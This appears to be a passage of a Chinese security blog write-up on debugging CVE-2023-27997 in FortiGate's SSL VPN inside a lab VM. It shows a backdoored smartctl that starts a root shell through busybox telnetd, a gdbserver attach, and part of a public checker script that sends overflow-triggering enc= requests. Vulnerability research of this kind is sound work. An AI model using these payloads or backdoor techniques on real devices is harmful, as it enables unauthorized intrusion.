<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="henry">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/03/05/sslvpn-cve-2023-27997/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="Debug &amp; exploitfortigate 虚拟机的ip地址：192.168.127.133 测试机（fortigate）booting the kernel的时候，立马回到调试机，执行target remote 192.168.127.1:12345 然后在测试机输入登录账号（admin）和密码（mhl123），在测试机执行 1diagnose hardware smartctl">
<meta property="og:type" content="article">
<meta property="og:title" content="Fortigate SSLVPN-CVE-2023-27997">
<meta property="og:url" content="http://example.com/2025/03/05/SSLVPN-CVE-2023-27997/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Debug &amp; exploitfortigate 虚拟机的ip地址：192.168.127.133 测试机（fortigate）booting the kernel的时候，立马回到调试机，执行target remote 192.168.127.1:12345 然后在测试机输入登录账号（admin）和密码（mhl123），在测试机执行 1diagnose hardware smartctl">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-19_17-31-51.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-19_17-25-41.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_18-41-50.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-19_17-38-01.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-19_17-51-03.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-19_17-51-19.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_10-49-47.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_14-22-00.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_14-44-11.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_14-56-26.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_14-57-58.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_15-00-39.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_15-03-02.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_15-03-29.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_15-04-44.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-29-57.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-33-26.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-41-22.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-43-22.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-45-36.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-53-12.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_21-57-05.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_22-11-22.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_22-13-35.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_22-17-13.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-02_22-18-09.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-02-24_16-43-26.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_02-29-37.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_02-32-30.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_02-47-47.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_02-50-30.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_02-59-09.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_03-07-17.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_03-08-16.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_03-17-46.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_03-19-10.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-03-05_03-27-52.png">
<meta property="article:published_time" content="2025-03-05T06:49:15.227Z">
<meta property="article:modified_time" content="2025-03-05T06:59:11.093Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="iot">
<meta property="article:tag" content="fortigate">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Snipaste_2025-02-19_17-31-51.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/icon.png">
    <!--- Page Info-->
    
    <title>
        
            Fortigate SSLVPN-CVE-2023-27997 -
        
        Henry Martin
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Henry Martin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories/"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/tags"  >
                                    
                                        
                                            <i class="fa-regular fa-tags"></i>
                                        
                                        TAGS
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/links/">LINKS
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories/"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/tags"  >
                             
                                
                                    <i class="fa-regular fa-tags"></i>
                                
                                TAGS
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/links/">LINKS</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/Snipaste_2025-03-05_03-27-52.png" alt="Fortigate SSLVPN-CVE-2023-27997" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Fortigate SSLVPN-CVE-2023-27997</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/henry.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-03-05 14:49:15</span>
        <span class="mobile">2025-03-05 14:49:15</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-03-05 14:59:11</span>
            <span class="mobile">2025-03-05 14:59:11</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/IOT/">IOT</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/iot/">iot</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/fortigate/">fortigate</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="Debug-exploit"><a href="#Debug-exploit" class="headerlink" title="Debug & exploit"></a>Debug &amp; exploit</h2><p>fortigate 虚拟机的ip地址：192.168.127.133</p>
<p>测试机（fortigate）booting the kernel的时候，立马回到调试机，执行<code>target remote 192.168.127.1:12345</code></p>
<p>然后在测试机输入登录账号（admin）和密码（mhl123），在测试机执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diagnose hardware smartctl</span><br></pre></td></tr></table></figure></div>

<p>因为smartctl已经被替换为了后门文件，所以这里会触发后门程序</p>
<p>如果这里不执行这个命令的话，会像下面这张图一样，在第一次执行的时候 telnet 连接不上去，在执行之后，第二次连接就会正常连接到测试机</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.127.133 22</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-19_17-31-51.png" alt="nipaste_2025-02-19_17-31-5"></p>
<blockquote>
<p>注意要把下面的服务都打开，一定要记得把 telnet 加上去</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config system interface</span><br><span class="line">edit port1</span><br><span class="line">set mode static</span><br><span class="line">set ip 192.168.127.133 255.255.255.0</span><br><span class="line">set allowaccess http https ping ssh telnet</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-19_17-25-41.png" alt="nipaste_2025-02-19_17-25-4"></p>
<p>如果不加的话，可能会导致会在调试的时候出现下面的情况（链接直接被中断）：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_18-41-50.png" alt="nipaste_2025-03-02_18-41-5"></p>
<p><strong>gdb挂起调试程序sslvpnd</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># busybox ps -ef | grep /bin/sslvpnd</span></span><br><span class="line">  192 0         0:00 /bin/sslvpnd</span><br><span class="line">  311 0         0:00 grep /bin/sslvpnd</span><br><span class="line">/ <span class="comment"># busybox ps -ef | grep telnet</span></span><br><span class="line">  205 0         0:00 /bin/telnetd</span><br><span class="line">  301 0         0:00 /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22</span><br><span class="line">  314 0         0:00 grep telnet</span><br><span class="line">/ <span class="comment"># busybox kill 205&amp;&amp;gdbserver-7.10.1-x64 :23 --attach 192</span></span><br><span class="line">Attached; pid = 192</span><br><span class="line">Listening on port 23</span><br><span class="line">Remote debugging from host 192.168.127.142</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-19_17-38-01.png" alt="nipaste_2025-02-19_17-38-0"></p>
<p>然后我们就可以正常通过gdb来连接这个程序的服务了</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-19_17-51-03.png" alt="nipaste_2025-02-19_17-51-0"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-19_17-51-19.png" alt="nipaste_2025-02-19_17-51-1"></p>
<p>关于这个漏洞的产生与利用原理，<a class="link" target="_blank" rel="noopener" href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 在这篇博客中已经介绍的非常详细了（建议在阅读本文后续内容时，先学习这篇博客），本篇文章的重点在于实战调试分析以及利用该漏洞。</p>
<h3 id="Detect-vuln"><a href="#Detect-vuln" class="headerlink" title="Detect vuln"></a>Detect vuln</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/BishopFox/CVE-2023-27997-check">https://github.com/BishopFox/CVE-2023-27997-check <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>可以使用这个仓库的工具来检测目标靶机是否存在该漏洞，所以我们可以先用这个脚本来进行一个简单的检测。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_10-49-47.png" alt="nipaste_2025-02-24_10-49-4"></p>
<p>这里返回值是 vulnerable，说明存在该漏洞。</p>
<p><code>CVE-2023-27997</code> 漏洞可通过向 <code>FortiGate SSL VPN</code> 的 <code>/remote/hostcheck_validate</code> 或 <code>/remote/logincheck </code>端点发送包含 <code>enc=</code> 参数的特制 GET 或 POST 请求来触发。</p>
<p>先来解构一下这个检查脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, struct, hashlib, sys, os, re</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">from</span> scipy.stats <span class="keyword">import</span> ttest_ind</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Default 400 requests with valid length and 400 requests with too high of a length</span></span><br><span class="line"><span class="comment"># In most cases, we should break out of the loop long before we hit this number.</span></span><br><span class="line">REQUESTS_PER_GROUP = <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_enc_hdr</span>(<span class="params">salt, l</span>):</span><br><span class="line">    magic = <span class="string">b"GCC is the GNU Compiler Collection."</span></span><br><span class="line">    ks = hashlib.md5(salt + <span class="string">b"00bfbfbf"</span> + magic).digest()</span><br><span class="line">    length = struct.pack(<span class="string">"&lt;H"</span>, l)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"00bfbfbf{:02x}{:02x}"</span>.<span class="built_in">format</span>(length[<span class="number">0</span>] ^ ks[<span class="number">0</span>], length[<span class="number">1</span>] ^ ks[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_req</span>(<span class="params">session, baseurl, salt, allocsize, reqsize</span>):</span><br><span class="line">    payload = gen_enc_hdr(salt, reqsize) + <span class="string">"41"</span> * allocsize</span><br><span class="line">    payload = <span class="string">"ajax=1&amp;username=test&amp;realm=&amp;enc="</span> + payload</span><br><span class="line">    r = session.post(</span><br><span class="line">        baseurl + <span class="string">"/remote/hostcheck_validate"</span>,</span><br><span class="line">        headers={<span class="string">"content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>},</span><br><span class="line">        verify=<span class="literal">False</span>,</span><br><span class="line">        data=payload,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reject_outliers</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># This rejects ~25% of responses, but gives us much better sensitivity by filtering out random spikes in latency</span></span><br><span class="line">    q3 = np.quantile(data, <span class="number">0.75</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x &lt;= q3, data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_stats</span>(<span class="params">regular, overflow</span>):</span><br><span class="line">    overflow = reject_outliers(overflow)</span><br><span class="line">    regular = reject_outliers(regular)</span><br><span class="line">    t_stat = ttest_ind(overflow, regular, equal_var=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(overflow), <span class="built_in">len</span>(regular), t_stat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_target</span>(<span class="params">baseurl</span>):</span><br><span class="line">    r = requests.get(baseurl + <span class="string">"/remote/info"</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">"salt='([0-9a-f]{8})'"</span>)</span><br><span class="line">    matches = reg.findall(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matches) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ERROR: not FortiGate 